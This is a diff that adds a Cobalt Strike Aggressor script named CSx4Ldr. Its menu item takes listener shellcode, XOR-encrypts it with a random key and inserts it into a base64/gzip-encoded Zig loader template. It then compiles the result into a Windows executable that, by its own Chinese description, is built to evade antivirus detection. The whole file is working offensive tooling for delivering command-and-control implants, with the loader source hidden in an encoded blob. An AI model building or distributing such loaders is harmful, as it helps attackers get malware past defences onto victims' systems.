@@ -1,0 +1,78 @@
+popup attacks{
+	item("&CSx4Ldr",{x4Ldrmenu();});
+}
+
+bind Ctrl+J{
+	x4Ldrmenu();
+}
+
+
+# generate random string for variable substitution and keygens
+sub random_string {
+	$limit = 12;
+	@random_str = @();
+	$characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+	for ($x = 0; $x < $limit; $x++) {
+		$n = rand(strlen($characters));
+		add(@random_str, charAt($characters, $n));
+	}
+	return join('', @random_str);
+}
+
+# Format shellcode into C# type 0x90,0x90,0x90
+sub format_csharp {
+	$key = $1;
+	@fmt = str_chunk(transform($key, "hex"), 2);
+	return "0x". join(",0x", @fmt);
+}
+
+sub x4Ldrmenu {
+	$dialog = dialog("x4Ldrmenu", %(listener => "" , bit => false), &builder);
+    drow_listener_stage($dialog, "listener", "Listener: ");
+	dialog_description($dialog, "用于快速生成免杀的可执行文件。");
+	dbutton_action($dialog, "Generate");
+	dbutton_help($dialog, "https://github.com/yutianqaq/CSx4Ldr");
+	dialog_show($dialog);
+}
+
+sub builder {
+
+    $xorkey = random_string();
+    $format_shellcode = shellcode($3["listener"], false, "x64");
+    
+    $encrypted_shellcode = str_xor($format_shellcode, $xorkey);
+    $encrypted_test = str_xor("test", $xorkey);
+    $encrypted_shellcode_size = strlen($format_shellcode);
+    println("Key: ". $xorkey);
+    println("encrypted_shellcode_size: ". $encrypted_shellcode_size);
+
+	$code = gunzip(base64_decode("H4sIAAAAAAAAA31WW3ObOBR+96/Q5KFjsgxxL7Oz40wmJZg0zNrGY3DdbibLyCDXuFhQIZK4af77HknI4IQtD7HO/ejTp6OcnSFvV+SMI0Z+VCkjCdrlSZWRshfntOSo5Am6QB9T6dQ/AfHEOK9tqyrNeNsqFSltPCjm6T2JMIs34CfNVlxUllBon4eUgg0SW3lpgZDkD6W2fSeMkuz9O3AAi6XF817v7AyNyDqlBPF9ceg2CO15uJh502t/Wce0VTrtbO47bhBEQjmf2KHnT2vvDosOcuauHbpRsAhm7nTkjiBi8DhQ3wfttPSm9syrkylBm67tceDWFrnWhnC+0Hqx1Oobezoaa4MStGm09Oej2iLX2nDl++NaL5ZaHXj/uFGoAZGCNo1nn31P51JCY3KObE7bGLjOYu6FXyM7DOfe1SJ0A53/taXJqDs/PWp7PBO4R+ENQDxq4qKxF4iuTzHd5wX+UZEmoLt+l2edVfIgmvuL0Ju6hz11GV+yxB6PI9sRS33k1+LM0S/UF9JbyQADxMHjNXyKnOSRA1nRiabsCVpT9Ilwp2KMUD5jeUzK0kv6BopxlkHF+77ii4FqbDpT+AWhdXA/eRiRUtxZOxbyUAWaaOXRDWEpv8E0ychQssJEycOhaO3ZUVrzrLP255TxCmd2luWx+9jf1PmGdZSJssJOEiZVl4pLomyQ/oQmFO1MtFbxMBhyGsLVPXS9ziAfJzH//+40Pzu7W8KOSd3ShOxytu/s8AqX5NClbhLU1XpN2FCT3kT0uO2smFa7FWH++mrPSSmKcUKH6FQ5dDSrLmBnqw4jmJNwAz9JH3MOdS8b6powDHH8vZT1K/FjIqAM2xd5SvkL1wIzvHuhi0V6gHed4W+Q4f07E3FZK02EJygMdPnbk17ilF/nLEjpt4z4qy2cSn9Ts+lSY5lUTJaRJQzxR1G/qFYixw6nFNh9n6cJeurVyodlSifCEA3VXPOmcPemDqQDzeVrlRzKyyCcSymOAIEW1s2UNZQNKiH47jFD5YYIr4R8+fMDXNzb6K766wk9PQU37njs+CP3+Rk9n0t3J8NlmUJWj4qtwp767ejbgWXdGcqVEV4BXIPz3nOvJ47yN6FDdAs1DxCIcDVZCnUzoav2dX49b0z1aJiHd9DqnCDQWis5m3EGmV9c1rok8LrKMrMBx8oINSXKE3cSOf5k4oVKntmf3Mj9AnMWJrGYkkuYt24Ng36e921k/3a/Npg+5sylMZCWN4BIIMVu9hrSw2mtjm7V4cGqaCJf+UQljUDVcc8PmxN7N9HHgjMHl63CFmiMV7t+0y56DCI/nNDRXVXgDVolREVDozpQC6PVbMdF4rpbgTL8o+FNFa6KUC3cEsyx4pDETCxVdy9IJfDb1qNCPFGq/DpnSKaAp+n0HmcV+VX7iy9do/4WXVyIxAINA22bUJUUIqxT9K90ud3eNaYt+uMCvVXyM7T9H0XNsdZFCgAA"));
+	$final_shellcode = format_csharp($encrypted_shellcode);
+    $final_xorkey = format_csharp($xorkey);
+    println("format_fsharp: ". $final_xorkey);
+    $code = replace($code , '\{\{KEY\}\}' , $final_xorkey);
+	$code = replace($code , '\{\{SHELLCODE\}\}' , $final_shellcode);
+
+	prompt_file_save("x4Ldr.exe", {
+
+		if ("*Windows*" iswm systemProperties()["os.name"]) {
+			$path = replace($path, "\\\\", "\\\\\\\\");
+			$cmd = "zig build-exe /tmp/temp.zig -fstrip -fsingle-threaded --name x4Ldr";
+			$gofile = "C:\\\\windows\\\\temp\\\\temp.zig";
+			$clear = "del C:\\\\windows\\\\temp\\\\temp.zig";
+			$handle = openf("> $+ $gofile");
+		}else{
+			$cmd = "/home/kali/CSx4Ldr/zig/zig build-exe /tmp/temp.zig -fstrip -fsingle-threaded --name x4Ldr -target x86_64-windows";
+            $zigfile = "/tmp/temp.zig";
+			$clear = "rm /tmp/temp.zig";
+			$handle = openf("> $+ $zigfile");
+		}
+
+		writeb($handle, $code);
+		closef($handle);
+       	exec($cmd, $null, "/home/kali");
+		println("cmd: ". $cmd);
+		exec($clear);
+    });
+
+}
